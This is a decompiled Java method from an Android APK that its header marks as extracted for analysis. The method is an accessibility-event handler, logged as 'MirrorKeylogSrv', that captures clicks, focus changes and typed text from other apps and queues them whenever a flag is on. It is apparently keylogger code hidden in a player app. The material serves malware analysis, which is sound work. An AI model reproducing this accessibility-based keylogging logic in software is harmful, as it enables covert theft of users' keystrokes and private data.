// EXTRAIDO POR REA; representacion java; no es proyecto original.
// Evidencia: ev_05972ff61317af7c91081276b3928f2878e0fe4119ec98f3530f4f734c4a8dcd
// Selector: {'path': 'C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk', 'class_name': 'w1.j5', 'method_name': 'B'}

public final void B(AccessibilityEvent accessibilityEvent) {
    int eventType = accessibilityEvent.getEventType();
    if (eventType == 1) {
        try {
            h5 h5VarB = b(accessibilityEvent);
            if (h5VarB != null) {
                boolean z2 = h5VarB.f4198j;
                if (z2 || !F(h5VarB.f4189a, z2)) {
                    l(new d2.c(this, h5VarB, 5));
                    return;
                }
                return;
            }
            return;
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("onAccessibilityEvent click: "), "MirrorKeylogSrv");
            return;
        }
    }
    if (eventType == 8) {
        try {
            i5 i5VarD = d(accessibilityEvent);
            if (i5VarD == null || F(i5VarD.f4241a, i5VarD.n)) {
                return;
            }
            synchronized (this.f4313g) {
                try {
                    if (this.f4314h) {
                        this.f4318l.a(new a5(this, i5VarD, this.f4315i, 0));
                        return;
                    }
                    return;
                } catch (Throwable th2) {
                    throw th2;
                }
            }
        } catch (Throwable th3) {
            a0.a.p(th3, new StringBuilder("onAccessibilityEvent focus: "), "MirrorKeylogSrv");
            return;
        }
    }
    if (eventType != 16) {
        return;
    }
    try {
        i5 i5VarC = c(accessibilityEvent);
        if (i5VarC == null || F(i5VarC.f4241a, i5VarC.n)) {
            return;
        }
        synchronized (this.f4313g) {
            try {
                if (this.f4314h) {
                    this.f4318l.a(new a5(this, i5VarC, this.f4315i, 1));
                }
            } catch (Throwable th4) {
                throw th4;
            }
        }
    } catch (Throwable th5) {
        a0.a.p(th5, new StringBuilder("onAccessibilityEvent capture: "), "MirrorKeylogSrv");
    }
}
